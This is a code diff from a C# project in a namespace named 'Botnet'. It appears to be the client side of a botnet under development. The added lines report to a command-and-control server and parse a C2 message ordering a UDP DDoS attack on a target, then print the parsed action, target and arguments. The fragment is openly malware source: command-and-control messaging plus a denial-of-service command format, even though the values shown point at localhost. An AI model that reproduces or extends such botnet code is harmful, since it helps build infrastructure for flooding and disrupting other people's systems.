@@ -23,9 +23,16 @@ namespace Botnet    //espace de nom
             ServerConnectors sc = new ServerConnectors(IPAddress.Parse("127.0.0.1"), 2107);
 
             Initialization initialiser = new Initialization();
-
-            Console.WriteLine(DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"));
             initialiser.sendInfoToCNC();
+
+            ProtocolController ptclctl = new ProtocolController("<SOC><CMD>DDOS</CMD><TARGET>127.0.0.1</TARGET><ARG1>UDP</ARG1><ARG2>1500</ARG2><EOC>");
+            Console.WriteLine("Action: " + ptclctl.GetAction() + "\n");
+            Console.WriteLine("Target: " + ptclctl.GetTarget() + "\n");
+
+            foreach (string str in ptclctl.arguments)
+            {
+                Console.WriteLine(str);
+            }
 
             sc.ListenAndReceiveData();
             Console.WriteLine(sc.status);
